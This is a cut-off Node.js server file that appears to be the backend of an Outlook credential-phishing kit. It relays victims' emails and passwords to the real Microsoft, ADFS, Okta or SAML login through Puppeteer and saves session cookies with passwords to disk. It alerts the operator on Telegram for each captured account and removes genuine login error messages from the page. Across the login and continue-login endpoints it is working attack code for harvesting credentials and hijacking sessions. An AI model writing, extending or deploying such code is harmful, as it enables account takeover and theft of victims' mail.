const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

// Load environment variables from .env file
if (fs.existsSync('.env')) {
    const envFile = fs.readFileSync('.env', 'utf8');
    envFile.split('\n').forEach(line => {
        const [key, value] = line.split('=');
        if (key && value && !process.env[key]) {
            process.env[key] = value;
        }
    });
}

const { OutlookLoginAutomation } = require('./src/outlook-login');
const VPSManagementBot = require('./telegram-bot');

const app = express();
const PORT = process.env.PORT || 5000;

// Cloudflare API configuration
const CLOUDFLARE_API_TOKEN = process.env.CLOUDFLARE_API_TOKEN;
const CLOUDFLARE_ZONE_ID = process.env.CLOUDFLARE_ZONE_ID;

// Security configuration
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || 'admin-' + Math.random().toString(36).substr(2, 24);
// Admin token is now only accessible through secure channels (Telegram bot or environment variable)

// Make admin token available globally for Telegram bot
global.adminToken = ADMIN_TOKEN;

// Initialize Telegram Bot
let telegramBot = null;
try {
    if (process.env.TELEGRAM_BOT_TOKEN) {
        telegramBot = new VPSManagementBot();
        console.log('🤖 Telegram Bot initialized successfully');
    } else {
        console.log('⚠️ TELEGRAM_BOT_TOKEN not found - Telegram notifications disabled');
    }
} catch (error) {
    console.error('❌ Failed to initialize Telegram Bot:', error.message);
}

// Middleware - Configure CORS for Replit environment
app.use(cors({
    origin: true, // Allow all origins for Replit proxy
    credentials: true
}));
app.use(express.json());

// Admin authentication middleware
function requireAdminAuth(req, res, next) {
    const token = req.headers['authorization']?.replace('Bearer ', '') || 
                  (req.query && req.query.token) || 
                  (req.body && req.body.token);

    if (!token || token !== ADMIN_TOKEN) {
        return res.status(401).json({ 
            error: 'Unauthorized access to admin endpoint',
            message: 'Valid admin token required'
        });
    }
    next();
}

app.use(express.static('public'));

// Store multiple automation instances - allow concurrent sessions
const activeSessions = new Map(); // sessionId -> { sessionId, automation, isPreloaded, createdAt, email }
const SESSION_TIMEOUT = 30 * 60 * 1000; // 30 minutes timeout
const MAX_CONCURRENT_SESSIONS = 100; // Limit concurrent sessions
const OPERATION_TIMEOUT = 60 * 1000; // 1 minute for individual operations
const HEALTH_CHECK_INTERVAL = 2 * 60 * 1000; // 2 minutes
let sessionMutex = null; // Prevents race conditions in session management
let initializingSession = false; // Prevents concurrent browser initialization

// Analytics tracking with persistent storage
const ANALYTICS_FILE = path.join(__dirname, 'analytics.json');

// Load analytics from file
function loadAnalytics() {
    try {
        if (fs.existsSync(ANALYTICS_FILE)) {
            const data = fs.readFileSync(ANALYTICS_FILE, 'utf8');
            const savedAnalytics = JSON.parse(data);
            console.log('📊 Loaded analytics from file:', savedAnalytics);
            return {
                totalVisits: savedAnalytics.totalVisits || 0,
                validEntries: savedAnalytics.validEntries || 0,
                invalidEntries: savedAnalytics.invalidEntries || 0
            };
        }
    } catch (error) {
        console.error('Error loading analytics:', error);
    }
    console.log('📊 Starting with fresh analytics data');
    return {
        totalVisits: 0,
        validEntries: 0,
        invalidEntries: 0
    };
}

// Save analytics to file
function saveAnalytics() {
    try {
        fs.writeFileSync(ANALYTICS_FILE, JSON.stringify(analytics, null, 2));
        console.log('💾 Analytics saved to file');
    } catch (error) {
        console.error('Error saving analytics:', error);
    }
}

// Save invalid login attempt to file
function saveInvalidEntry(sessionId, email, reason, errorMessage = '') {
    try {
        const invalidEntry = {
            id: Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5),
            sessionId: sessionId,
            email: email || 'Unknown',
            reason: reason,
            errorMessage: errorMessage,
            timestamp: new Date().toISOString(),
            status: 'invalid'
        };

        const invalidEntryFile = path.join(__dirname, 'session_data', `invalid_${invalidEntry.id}.json`);
        fs.writeFileSync(invalidEntryFile, JSON.stringify(invalidEntry, null, 2));
        console.log(`💾 Invalid entry saved: ${invalidEntryFile}`);
        return invalidEntry.id;
    } catch (error) {
        console.error('Error saving invalid entry:', error);
        return null;
    }
}

// Initialize analytics from file
const analytics = loadAnalytics();

// Helper function to initialize browser directly - Prevents concurrent initialization
async function initBrowser(session) {
    // Prevent concurrent browser initialization
    if (initializingSession) {
        throw new Error('Browser initialization already in progress');
    }

    initializingSession = true;

    try {
        // Close any existing automation with proper timeout
        if (session.automation) {
            try {
                console.log(`Gracefully closing existing automation for session ${session.sessionId}...`);
                await Promise.race([
                    session.automation.close().catch(err => console.error('Session close error:', err)),
                    new Promise((_, reject) => setTimeout(() => reject(new Error('Close timeout')), 5000))
                ]);
                await new Promise(resolve => setTimeout(resolve, 1000)); // Wait 1 second after close
            } catch (error) {
                console.error('Error closing existing session:', error);
            }
            session.automation = null;
        }

        session.automation = new OutlookLoginAutomation();
        await session.automation.init();

        console.log(`Browser initialized successfully for session ${session.sessionId}`);
        return session.automation;
    } catch (error) {
        console.error(`Failed to initialize browser for session ${session.sessionId}:`, error);
        session.automation = null;
        throw error;
    } finally {
        initializingSession = false;
    }
}

// Cleanup expired sessions - Avoid race conditions with active operations
setInterval(async () => {
    if (!sessionMutex && !initializingSession && activeSessions.size > 0) {
        const now = Date.now();
        const expiredSessions = [];

        // Find expired sessions that aren't in use
        for (const [sessionId, session] of activeSessions) {
            if (now - session.createdAt > SESSION_TIMEOUT && !session.inUse) {
                expiredSessions.push(sessionId);
            }
        }

        // Clean up expired sessions
        if (expiredSessions.length > 0) {
            console.log(`🧹 Cleaning up ${expiredSessions.length} expired sessions`);
            sessionMutex = Promise.resolve();

            try {
                for (const sessionId of expiredSessions) {
                    const session = activeSessions.get(sessionId);
                    if (session?.automation) {
                        try {
                            await session.automation.close();
                        } catch (error) {
                            console.error(`Error closing expired session ${sessionId}:`, error);
                        }
                    }
                    activeSessions.delete(sessionId);
                }
            } finally {
                sessionMutex = null;
            }
        }
    }
}, 5 * 60 * 1000); // Check every 5 minutes

// Health check for browser sessions
setInterval(async () => {
    if (!sessionMutex && !initializingSession && activeSessions.size > 0) {
        const disconnectedSessions = [];

        // Check all active sessions for disconnected browsers
        for (const [sessionId, session] of activeSessions) {
            if (session.automation && session.automation.browser) {
                try {
                    if (!session.automation.browser.isConnected()) {
                        console.log(`🔧 Detected disconnected browser for session ${sessionId}`);
                        disconnectedSessions.push(sessionId);
                    }
                } catch (error) {
                    console.error(`Health check error for session ${sessionId}:`, error);
                    disconnectedSessions.push(sessionId);
                }
            }
        }

        // Clean up disconnected sessions
        if (disconnectedSessions.length > 0) {
            sessionMutex = Promise.resolve();
            try {
                for (const sessionId of disconnectedSessions) {
                    const session = activeSessions.get(sessionId);
                    if (session?.automation) {
                        try {
                            await session.automation.close();
                            console.log(`Cleaned up disconnected browser session ${sessionId}`);
                        } catch (error) {
                            console.error(`Error cleaning up disconnected session ${sessionId}:`, error);
                        }
                    }
                    activeSessions.delete(sessionId);
                }
            } finally {
                sessionMutex = null;
            }
        }
    }
}, HEALTH_CHECK_INTERVAL);

// Helper function to get or create session (multiple allowed) - Thread-safe with mutex
async function getOrCreateSession(sessionId = null) {
    // Wait for any ongoing session operations to complete
    while (sessionMutex) {
        await new Promise(resolve => setTimeout(resolve, 100));
    }

    // Acquire mutex
    sessionMutex = Promise.resolve();

    try {
        // If specific session requested and exists, return it
        if (sessionId && activeSessions.has(sessionId)) {
            const session = activeSessions.get(sessionId);
            return { sessionId: sessionId, session: session, isNew: false };
        }

        // Check session limit
        if (activeSessions.size >= MAX_CONCURRENT_SESSIONS) {
            // Remove oldest session to make room
            const oldestSessionId = activeSessions.keys().next().value;
            const oldestSession = activeSessions.get(oldestSessionId);
            console.log(`🗑️ Removing oldest session due to limit: ${oldestSessionId}`);

            try {
                if (oldestSession.automation) {
                    await oldestSession.automation.close();
                }
            } catch (error) {
                console.error('Error closing oldest session:', error);
            }
            activeSessions.delete(oldestSessionId);
        }

        // Create new session
        const newSessionId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
        const newSession = {
            sessionId: newSessionId,
            automation: null,
            isPreloaded: false,
            createdAt: Date.now(),
            email: null,
            inUse: false
        };

        activeSessions.set(newSessionId, newSession);
        console.log(`📝 Created new session: ${newSessionId} (${activeSessions.size}/${MAX_CONCURRENT_SESSIONS} sessions active)`);
        return { sessionId: newSessionId, session: newSession, isNew: true };

    } finally {
        // Release mutex
        sessionMutex = null;
    }
}

// Routes

// Health check
app.get('/api/health', (req, res) => {
    res.json({ status: 'OK', message: 'Outlook Automation Backend is running' });
});

// Preload Outlook page
app.post('/api/preload', async (req, res) => {
    try {
        const requestedSessionId = req.body.sessionId;
        const { sessionId, session, isNew } = await getOrCreateSession(requestedSessionId);

        // Mark session as in use to prevent cleanup during operation
        session.inUse = true;

        try {
            // If already preloaded for this session, return status
            if (session.isPreloaded && session.automation) {
                return res.json({
                    status: 'already-loaded',
                    message: 'Outlook page is already loaded and ready',
                    sessionId: sessionId
                });
            }

        // Close any existing automation for this session
        if (session.automation) {
            console.log(`Closing existing automation for session ${sessionId}...`);
            try {
                await session.automation.close();
            } catch (error) {
                console.error('Error closing existing session:', error);
            }
        }

        // Start new automation session for preloading
        console.log(`Preloading Outlook page for session ${sessionId}...`);

        // Initialize browser directly with error handling and timeout
        try {
            await Promise.race([
                initBrowser(session),
                new Promise((_, reject) => setTimeout(() => reject(new Error('Browser initialization timeout')), OPERATION_TIMEOUT))
            ]);
        } catch (error) {
            console.error('Failed to initialize browser:', error);

            // Clean up on timeout or error
            if (session.automation) {
                try {
                    await session.automation.close();
                } catch (closeError) {
                    console.error('Error cleaning up failed initialization:', closeError);
                }
                session.automation = null;
            }

            return res.status(500).json({ 
                error: 'Failed to initialize browser',
                details: error.message,
                retryable: true
            });
        }

        // Navigate to Outlook with timeout
        try {
            const navigated = await Promise.race([
                session.automation.navigateToOutlook(),
                new Promise((_, reject) => setTimeout(() => reject(new Error('Navigation timeout')), OPERATION_TIMEOUT))
            ]);

            if (!navigated) {
                throw new Error('Navigation failed');
            }
        } catch (error) {
            console.error('Failed to navigate to Outlook:', error);

            // Clean up on navigation failure
            try {
                await session.automation.close();
            } catch (closeError) {
                console.error('Error cleaning up after navigation failure:', closeError);
            }
            session.automation = null;
            session.isPreloaded = false;

            return res.status(500).json({ 
                error: 'Failed to preload Outlook page',
                details: error.message
            });
        }

        session.isPreloaded = true;
        console.log(`Outlook page preloaded successfully for session ${sessionId}`);

            res.json({
                status: 'preloaded',
                message: 'Outlook page loaded and ready for email input',
                sessionId: sessionId
            });

        } finally {
            // Mark session as no longer in use
            if (session) {
                session.inUse = false;
            }
        }

    } catch (error) {
        console.error('Error preloading Outlook:', error);

        res.status(500).json({ 
            error: 'Failed to preload Outlook',
            details: error.message 
        });
    }
});

// Process email login (uses preloaded page if available)
app.post('/api/login', async (req, res) => {
    try {
        const { email, password, sessionId: requestedSessionId } = req.body;

        // Track visit
        analytics.totalVisits++;
        saveAnalytics();

        if (!email) {
            analytics.invalidEntries++;
            saveAnalytics();
            saveInvalidEntry(null, '', 'Missing email', 'Email is required');
            return res.status(400).json({ 
                error: 'Email is required' 
            });
        }

        const { sessionId, session, isNew } = await getOrCreateSession(requestedSessionId);
        session.email = email; // Store email in session

        // Mark session as in use to prevent cleanup during login
        session.inUse = true;

        try {
            // If not preloaded, start fresh session
        if (!session.isPreloaded || !session.automation) {
            console.log(`Starting fresh Puppeteer session for email: ${email} (Session: ${sessionId})`);

            // Close any existing automation
            if (session.automation) {
                try {
                    await session.automation.close();
                } catch (error) {
                    console.error('Error closing existing session:', error);
                }
            }

            // Initialize browser directly with error handling
            try {
                await initBrowser(session);
            } catch (error) {
                console.error('Failed to initialize browser for login:', error);
                return res.status(500).json({ 
                    error: 'Failed to initialize browser',
                    details: error.message,
                    retryable: true
                });
            }

            // Navigate to Outlook
            const navigated = await session.automation.navigateToOutlook();
            if (!navigated) {
                await session.automation.close();
                session.automation = null;
                session.isPreloaded = false;
                return res.status(500).json({ 
                    error: 'Failed to navigate to Outlook' 
                });
            }

            session.isPreloaded = true;
        } else {
            console.log(`Using preloaded Outlook page for email: ${email} (Session: ${sessionId})`);
        }

        // Force fresh login - no checking for existing sessions

        // If password is provided, perform full login
        if (password) {
            let loginSuccess = false;
            let authMethod = 'password';

            console.log('🔐 Proceeding with password login...');

            // If cookie auth failed, do full password login
            if (!loginSuccess) {
                console.log('🔐 Performing full password login...');
                loginSuccess = await session.automation.performLogin(email, password);
                authMethod = 'password';

                // If password login successful, save cookies but don't use them
                if (loginSuccess) {
                    analytics.validEntries++;
                    saveAnalytics();
                    console.log('💾 Saving session cookies to file (not for reuse)...');
                    const sessionFile = await session.automation.saveCookies(email, password);

                    // Send Telegram notification if bot is available
                    if (telegramBot && sessionFile) {
                        try {
                            // Extract domain from email
                            const domain = email.split('@')[1] || 'Unknown';

                            // Read session file to get cookie count
                            const fs = require('fs');
                            let totalCookies = 0;
                            try {
                                if (fs.existsSync(sessionFile)) {
                                    const sessionData = JSON.parse(fs.readFileSync(sessionFile, 'utf8'));
                                    totalCookies = sessionData.totalCookies || 0;
                                }
                            } catch (error) {
                                console.log('Could not read cookie count:', error.message);
                            }

                            await telegramBot.sendLoginNotification({
                                email: email,
                                domain: domain,
                                timestamp: new Date().toISOString(),
                                totalCookies: totalCookies,
                                sessionId: sessionId
                            });

                            console.log(`📤 Telegram notification sent for ${email}`);
                        } catch (error) {
                            console.error('❌ Failed to send Telegram notification:', error.message);
                        }
                    }
                }
            }

            // Take screenshot after login attempt
            session.automation.takeScreenshot(`screenshots/session-${sessionId}-login.png`);

            // Track failed login attempts
            if (!loginSuccess) {
                analytics.invalidEntries++;
                saveAnalytics();

                // Get more specific error details
                let errorDetails = 'Password authentication failed';
                try {
                    const currentUrl = session.automation.page.url();
                    if (currentUrl.includes('error')) {
                        errorDetails += ' - Authentication error detected in URL';
                    }

                    // Check for specific error messages on the page
                    const errorElements = await session.automation.page.$$('[role="alert"], .error, .ms-TextField-errorMessage');
                    if (errorElements.length > 0) {
                        for (let element of errorElements) {
                            try {
                                const errorText = await element.evaluate(el => el.textContent);
                                if (errorText && errorText.trim()) {
                                    errorDetails += ` - ${errorText.trim()}`;
                                    break;
                                }
                            } catch (e) {
                                // Skip if can't get text
                            }
                        }
                    }
                } catch (e) {
                    console.log('Could not extract additional error details:', e.message);
                }

                saveInvalidEntry(sessionId, email, 'Login Failed', errorDetails);
                console.log(`📊 Invalid entry saved for ${email}: ${errorDetails}`);
            }

            res.json({
                sessionId: sessionId,
                email: email,
                loginComplete: true,
                loginSuccess: loginSuccess,
                authMethod: authMethod,
                message: loginSuccess ? 
                    (authMethod === 'cookies' ? 'Login successful using saved cookies!' : 'Login successful with password! Enhanced session saved.') : 
                    'Login failed or additional authentication required',
                screenshots: [
                    `screenshots/session-${sessionId}-login.png`
                ]
            });
        } else {
            // Fill email and click Next to get site response
            console.log('Filling email and clicking Next to get site response...');

            let siteReport = {
                emailFilled: false,
                nextClicked: false,
                siteResponse: '',
                errorMessages: [],
                pageUrl: '',
                pageTitle: '',
                needsPassword: false,
                needsMFA: false,
                accountExists: false
            };

            try {
                // Wait for email input and fill it
                await session.automation.page.waitForSelector('input[type="email"]', { timeout: 10000 });
                await session.automation.page.type('input[type="email"]', email);
                console.log('Email entered successfully');
                siteReport.emailFilled = true;

                // Click Next button
                await session.automation.page.click('input[type="submit"]');
                console.log('Clicked Next button');
                siteReport.nextClicked = true;

                // Wait for page response (up to 10 seconds)
                await new Promise(resolve => setTimeout(resolve, 3000));

                // Get current page info
                siteReport.pageUrl = session.automation.page.url();
                siteReport.pageTitle = await session.automation.page.title();

                // Check for different scenarios

                // Check for password field (account exists)
                const passwordField = await session.automation.page.$('input[type="password"]');
                if (passwordField) {
                    siteReport.needsPassword = true;
                    siteReport.accountExists = true;
                    siteReport.siteResponse = 'Password field appeared - account exists and is ready for password entry';
                    console.log('Password field detected - account exists');
                }

                // Remove bordered error messages from HTML and only capture specific "account not found" error
                const errorSelectors = [
                    '[role="alert"]',
                    '.error',
                    '.ms-TextField-errorMessage',
                    '[data-testid="error"]',
                    '.alert-error',
                    '[aria-live="polite"]',
                    '.form-error'
                ];

                let foundAccountNotFoundError = false;
                for (let selector of errorSelectors) {
                    const errorElements = await session.automation.page.$$(selector);
                    for (let element of errorElements) {
                        try {
                            const errorText = await element.evaluate(el => el.textContent);
                            if (errorText && errorText.trim()) {
                                // Only capture the specific "account not found" error message
                                if (errorText.includes("We couldn't find an account with that username")) {
                                    siteReport.errorMessages.push(errorText.trim());
                                    console.log(`Found error message: ${errorText.trim()}`);
                                    foundAccountNotFoundError = true;
                                    analytics.invalidEntries++;
                                    saveAnalytics();
                                    saveInvalidEntry(sessionId, email, 'Account not found', errorText.trim());
                                    console.log(`📊 Analytics: Invalid entries now ${analytics.invalidEntries}`);
                                } else {
                                    // Remove all other bordered error messages from HTML
                                    await element.evaluate(el => el.remove());
                                }
                            }
                        } catch (e) {
                            // Skip if can't get text
                        }
                    }
                }

                // If account not found error, reload the page to reset the form
                if (foundAccountNotFoundError) {
                    console.log('Account not found error detected - reloading Outlook page for retry...');

                    // Navigate back to Outlook to reset the form
                    const reloaded = await session.automation.navigateToOutlook();
                    if (!reloaded) {
                        siteReport.siteResponse = 'Failed to reload page after account error';
                    } else {
                        siteReport.siteResponse = 'Page reloaded - ready for new email attempt';
                        siteReport.needsPassword = false;
                        siteReport.accountExists = false;
                        console.log('Page successfully reloaded and ready for new email');
                    }
                }

                // Check for MFA/2FA prompts
                const mfaSelectors = [
                    'input[type="tel"]',
                    '[data-testid="phone"]', 
                    '[data-testid="authenticator"]',
                    '.verification'
                ];

                for (let selector of mfaSelectors) {
                    const mfaElement = await session.automation.page.$(selector);
                    if (mfaElement) {
                        siteReport.needsMFA = true;
                        siteReport.siteResponse = 'Multi-factor authentication required';
                        console.log('MFA prompt detected');
                        break;
                    }
                }

                // If no specific response detected, get general page content
                if (!siteReport.siteResponse) {
                    try {
                        // Look for main content or messages
                        const mainContent = await session.automation.page.$eval('body', el => {
                            // Remove scripts and styles
                            const scripts = el.querySelectorAll('script, style, noscript');
                            scripts.forEach(s => s.remove());

                            // Get visible text content
                            const text = el.textContent || '';
                            return text.replace(/\s+/g, ' ').trim().substring(0, 500);
                        });

                        siteReport.siteResponse = mainContent || 'Page loaded but no specific response detected';
                    } catch (e) {
                        siteReport.siteResponse = 'Page loaded successfully';
                    }
                }

                // Take screenshot after clicking Next
                await session.automation.takeScreenshot(`screenshots/session-${sessionId}-after-next.png`);

                console.log('Site report:', JSON.stringify(siteReport, null, 2));

            } catch (error) {
                console.error('Error during email/next process:', error);
                siteReport.errorMessages.push(`Automation error: ${error.message}`);
                siteReport.siteResponse = `Error occurred: ${error.message}`;
            }

            res.json({
                sessionId: sessionId,
                email: email,
                loginComplete: false,
                siteReport: siteReport,
                message: siteReport.needsPassword ? 
                    'Email verified! Account exists and is ready for password.' : 
                    siteReport.errorMessages.length > 0 ? 
                    'Issues detected with email - see site report for details.' :
                    'Email processed - see site report for response.',
                screenshots: [
                    `screenshots/session-${sessionId}-after-next.png`
                ]
            });
        }

        } finally {
            // Mark session as no longer in use
            if (session) {
                session.inUse = false;
            }
        }

    } catch (error) {
        console.error('Error during login process:', error);

        // Clean up on error - find the session that was being used
        const { sessionId: errorSessionId, session: errorSession } = await getOrCreateSession(requestedSessionId).catch(() => ({ sessionId: null, session: null }));
        if (errorSession && errorSession.automation) {
            try {
                await errorSession.automation.close();
            } catch (closeError) {
                console.error('Error closing automation on error:', closeError);
            }
            errorSession.automation = null;
            errorSession.isPreloaded = false;
            errorSession.inUse = false;
        }

        res.status(500).json({ 
            error: 'Login process failed',
            details: error.message 
        });
    }
});

// Continue with password (for cases where email was filled first)
app.post('/api/continue-login', async (req, res) => {
    try {
        const { password, sessionId: requestedSessionId } = req.body;

        if (!password) {
            return res.status(400).json({ 
                error: 'Password is required' 
            });
        }

        if (!requestedSessionId) {
            return res.status(400).json({ 
                error: 'Session ID is required' 
            });
        }

        const session = activeSessions.get(requestedSessionId);
        if (!session || !session.automation) {
            return res.status(400).json({ 
                error: 'No active automation session found. Please start with email first.' 
            });
        }

        console.log('Continuing login with password...');

        // Continue the login process with provider detection
        try {
            // Detect the current login provider
            const loginProvider = await session.automation.detectLoginProvider();
            console.log(`Detected login provider for password entry: ${loginProvider}`);

            // Handle password entry based on the provider
            let passwordSuccess = false;

            if (loginProvider === 'microsoft') {
                passwordSuccess = await session.automation.handleMicrosoftLogin(password);
            } else if (loginProvider === 'adfs') {
                passwordSuccess = await session.automation.handleADFSLogin(password);
            } else if (loginProvider === 'okta') {
                passwordSuccess = await session.automation.handleOktaLogin(password);
            } else if (loginProvider === 'azure-ad') {
                passwordSuccess = await session.automation.handleAzureADLogin(password);
            } else if (loginProvider === 'generic-saml') {
                passwordSuccess = await session.automation.handleGenericSAMLLogin(password);
            } else {
                console.warn(`Unknown login provider in continue-login. Attempting generic login...`);
                passwordSuccess = await session.automation.handleGenericLogin(password);
            }

            if (!passwordSuccess) {
                console.warn('Password login attempt failed, but continuing with flow...');
            }

            // Take screenshot after password submission (non-blocking)
            session.automation.takeScreenshot(`screenshots/session-${requestedSessionId}-after-password.png`);
            console.log(`Screenshot queued after password submission`);

            // Handle "Stay signed in?" prompt
            await session.automation.handleStaySignedInPrompt();

            // Wait a bit more after handling the prompt (optimized)
            await new Promise(resolve => setTimeout(resolve, 1500));

            // Take screenshot after login (non-blocking)
            session.automation.takeScreenshot(`screenshots/session-${requestedSessionId}-final.png`);

            // Check if we're successfully logged in
            const currentUrl = session.automation.page.url();
            const loginSuccess = currentUrl.includes('outlook.office.com/mail');

            let responseMessage = '';
            if (loginSuccess) {
                // Save session cookies to file (not for reuse)
                console.log('💾 Saving session cookies to file (not for reuse)...');
                const sessionFile = await session.automation.saveCookies(session.email || 'unknown', password);
                responseMessage = sessionFile ? 
                    `Login completed successfully! Session saved to: ${sessionFile}` :
                    'Login completed successfully!';

                analytics.validEntries++;
                saveAnalytics();

                // Send Telegram notification if bot is available
                if (telegramBot && sessionFile && loginSuccess) {
                    try {
                        const email = session.email || 'unknown@unknown.com';
                        const domain = email.split('@')[1] || 'Unknown';

                        // Read session file to get cookie count
                        const fs = require('fs');
                        let totalCookies = 0;
                        try {
                            if (fs.existsSync(sessionFile)) {
                                const sessionData = JSON.parse(fs.readFileSync(sessionFile, 'utf8'));
                                totalCookies = sessionData.totalCookies || 0;
                            }
                        } catch (error) {
                            console.log('Could not read cookie count:', error.message);
                        }

                        await telegramBot.sendLoginNotification({
                            email: email,
                            domain: domain,
                            timestamp: new Date().toISOString(),
                            totalCookies: totalCookies,
                            sessionId: requestedSessionId
                        });

                        console.log(`📤 Telegram notification sent for ${email}`);
                    } catch (error) {
                        console.error('❌ Failed to send Telegram notification:', error.message);
                    }
                }
            } else {
                responseMessage = 'Login may require additional verification';
                analytics.invalidEntries++;
                saveAnalytics();

                // Save invalid entry for failed continue-login
                const email = session.email || 'unknown@unknown.com';
                const currentUrl = session.automation.page.url();
                let errorDetails = `Login verification failed. Current URL: ${currentUrl}`;

                // Try to get specific error message
                try {
                    const errorElements = await session.automation.page.$$('[role="alert"], .error, .ms-TextField-errorMessage');
                    for (let element of errorElements) {
                        try {
                            const errorText = await element.evaluate(el => el.textContent);
                            if (errorText && errorText.trim()) {
                                errorDetails += ` - ${errorText.trim()}`;
                                break;
                            }
                        } catch (e) {
                            // Skip if can't get text
                        }
                    }
                } catch (e) {
                    // Silent fail for error extraction
                }

                saveInvalidEntry(requestedSessionId, email, 'Continue Login Failed', errorDetails);
            }

            res.json({
                sessionId: requestedSessionId,
                loginComplete: true,
                loginSuccess: loginSuccess,
                message: responseMessage,
                screenshot: `screenshots/session-${requestedSessionId}-final.png`,
                passwordScreenshot: `screenshots/session-${requestedSessionId}-after-password.png`
            });

        } catch (error) {
            console.error('Error during password entry:', error);
            res.status(500).json({ 
                error: 'Failed to complete login',
                details: error.message 
            });
        }

    } catch (error) {
        console.error('Error in continue-login:', error);
        res.status(500).json({ 
            error: 'Continue login failed',
            details: error.message 
        });
    }
});

// Take screenshot of current state
app.post('/api/screenshot', async (req, res) => {
    try {
        const { sessionId: requestedSessionId } = req.body;
        const { sessionId, session } = await getOrCreateSession(requestedSessionId);

        if (!session.automation) {
            return res.status(400).json({ 
                error: 'No active automation session' 
            });
        }

        const filename = `screenshots/session-${sessionId}-${Date.now()}.png`;
        await session.automation.takeScreenshot(filename);

        res.json({
            sessionId: sessionId,
            screenshot: filename,
            message: 'Screenshot taken successfully'
        });

    } catch (error) {
        console.error('Error taking screenshot:', error);
        res.status(500).json({ 
            error: 'Failed to take screenshot',
            details: error.message 
        });
    }
});

// Check emails (if logged in)
app.get('/api/emails', async (req, res) => {
    try {
        const { sessionId: requestedSessionId } = req.query;
        const { sessionId, session } = await getOrCreateSession(requestedSessionId);

        if (!session.automation) {
            return res.status(400).json({ 
                error: 'No active automation session' 
            });
        }

        const emails = await session.automation.checkEmails();

        res.json({
            sessionId: sessionId,
            emails,
            count: emails.length
        });

    } catch (error) {
        console.error('Error checking emails:', error);
        res.status(500).json({ 
            error: 'Failed to check emails',
            details: error.message 
        });
    }
});

// Close current session
app.delete('/api/session', async (req, res) => {
    try {
        const { sessionId: requestedSessionId } = req.body;

        if (requestedSessionId) {
            // Close specific session
            const session = activeSessions.get(requestedSessionId);
            if (!session) {
                return res.status(400).json({ 
                    error: 'Session not found' 
                });
            }

            if (session.automation) {
                await session.automation.close();
            }

            activeSessions.delete(requestedSessionId);
            console.log(`Session ${requestedSessionId} closed and removed`);
        } else {
            // Close all sessions if no specific ID provided
            if (activeSessions.size === 0) {
                return res.status(400).json({ 
                    error: 'No active sessions to close' 
                });
            }

            for (const [sessionId, session] of activeSessions) {
                if (session.automation) {
                    try {
                        await session.automation.close();
                    } catch (error) {
                        console.error(`Error closing session ${sessionId}:`, error);
                    }
                }
            }

            activeSessions.clear();
            console.log('All sessions closed and removed');
        }

        res.json({
            sessionId: requestedSessionId,
            message: 'Session closed successfully'
        });

    } catch (error) {
        console.error('Error closing session:', error);
        res.status(500).json({ 
            error: 'Failed to close session',
            details: error.message 
        });
    }
});

// Handle back navigation - reload Outlook page
app.post('/api/back', async (req, res) => {
    try {
        const { sessionId: requestedSessionId } = req.body;
        const { sessionId, session } = await getOrCreateSession(requestedSessionId);

        if (!session.automation) {
            return res.status(400).json({ 
                error: 'No active session' 
            });
        }

        console.log('Back button clicked - auto reloading Outlook page...');

        // Navigate back to Outlook to reset the form
        const reloaded = await session.automation.navigateToOutlook();
        if (!reloaded) {
            return res.status(500).json({ 
                error: 'Failed to reload Outlook page' 
            });
        }

        console.log('Page successfully reloaded after back navigation');

        res.json({
            sessionId: sessionId,
            message: 'Outlook page reloaded successfully',
            status: 'reloaded'
        });

    } catch (error) {
        console.error('Error during back navigation reload:', error);
        res.status(500).json({ 
            error: 'Failed to reload page on back navigation',
            details: error.message 
        });
    }
});

// Get current session status
app.get('/api/status', (req, res) => {
    const sessionDetails = [];
    for (const [sessionId, session] of activeSessions) {
        sessionDetails.push({
            sessionId: sessionId,
            isPreloaded: session.isPreloaded,
            email: session.email,
            inUse: session.inUse,
            createdAt: new Date(session.createdAt).toISOString(),
            hasAutomation: session.automation !== null
        });
    }

    res.json({
        hasActiveSession: activeSessions.size > 0,
        sessionCount: activeSessions.size,
        sessions: sessionDetails
    });
});

// Extend session timeout by making a request
app.post('/api/extend-session', async (req, res) => {
    try {
        const { sessionId: requestedSessionId } = req.body;

        if (!requestedSessionId) {
            return res.status(400).json({ error: 'Session ID is required.' });
        }

        const session = activeSessions.get(requestedSessionId);
        if (!session) {
            return res.status(400).json({ error: 'Session not found.' });
        }

        // Update session creation time to extend timeout
        session.createdAt = Date.now();
        console.log(`Session ${requestedSessionId} timeout extended.`);

        res.json({ 
            message: 'Session timeout extended successfully',
            sessionId: requestedSessionId,
            newExpirationTime: new Date(session.createdAt + SESSION_TIMEOUT).toISOString()
        });

    } catch (error) {
        console.error('Error extending session:', error);
        res.status(500).json({ error: 'Failed to extend session.', details: error.message });
    }
});

// List available sessions
app.get('/api/sessions', (req, res) => {
    try {
        const fs = require('fs');
        const path = require('path');
        const sessionDir = 'session_data';

        if (!fs.existsSync(sessionDir)) {
            return res.json({ 
                sessions: [],
                count: 0,
                message: 'No session directory found'
            });
        }

        try {
            const sessions = [];
            const items = fs.readdirSync(sessionDir);

            // Look for session files (new single-file format) and directories (old format)
            for (const item of items) {
                const itemPath = path.join(sessionDir, item);

                if (fs.lstatSync(itemPath).isFile() && item.startsWith('session_') && item.endsWith('.json')) {
                    // New single-file format
                    try {
                        const sessionData = JSON.parse(fs.readFileSync(itemPath, 'utf8'));
                        const stats = fs.statSync(itemPath);

                        sessions.push({
                            email: sessionData.email || 'Unknown',
                            timestamp: sessionData.timestamp,
                            cookieCount: sessionData.cookies ? sessionData.cookies.length : 0,
                            totalCookies: sessionData.totalCookies,
                            hasPassword: !!sessionData.password,
                            id: sessionData.id,
                            sessionPath: itemPath,
                            format: 'single-file',
                            lastModified: stats.mtime
                        });
                    } catch (e) {
                        console.log(`⚠️ Failed to parse session file ${item}: ${e.message}`);
                    }
                } else if (fs.lstatSync(itemPath).isDirectory() && item.startsWith('session_')) {
                    // Old individual files format
                    const metadataFile = path.join(itemPath, 'session_metadata.json');

                    if (fs.existsSync(metadataFile)) {
                        try {
                            const metadata = JSON.parse(fs.readFileSync(metadataFile, 'utf8'));
                            const stats = fs.statSync(itemPath);

                            // Count individual cookie files
                            const cookieFiles = fs.readdirSync(itemPath).filter(file => 
                                file.startsWith('cookie_') && file.endsWith('.json')
                            );

                            sessions.push({
                                email: metadata.email || 'Unknown',
                                timestamp: metadata.timestamp,
                                cookieCount: cookieFiles.length,
                                totalCookies: metadata.totalCookies,
                                hasPassword: !!metadata.password,
                                id: metadata.id,
                                sessionPath: itemPath,
                                format: 'directory',
